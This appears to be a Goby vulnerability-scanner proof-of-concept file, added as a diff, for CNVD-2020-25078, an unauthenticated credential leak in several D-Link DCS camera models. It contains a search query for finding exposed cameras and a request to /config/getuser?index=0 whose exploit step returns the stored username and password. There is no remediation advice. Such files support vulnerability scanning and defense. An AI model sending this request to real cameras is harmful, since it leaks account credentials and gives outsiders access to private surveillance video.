@@ -1,0 +1,77 @@
+{
+      "Name": "D-Link DCS系列监控 账号密码信息泄露漏洞 CNVD-2020-25078",
+      "Level": "1",
+      "Tags": [
+            "账号密码泄露"
+      ],
+      "GobyQuery": "(app=\"DLink-Network-Camera\" || title=\"Document Error: Unauthorized\")",
+      "Description": "D-Link DCS系列监控 通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面",
+      "Product": "DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703",
+      "Homepage": "PeiQi",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/config/getuser?index=0",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "name",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "pass",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/config/getuser?index=0",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-03-29 14:08:02",
+      "GobyVersion": "1.8.237"
+}
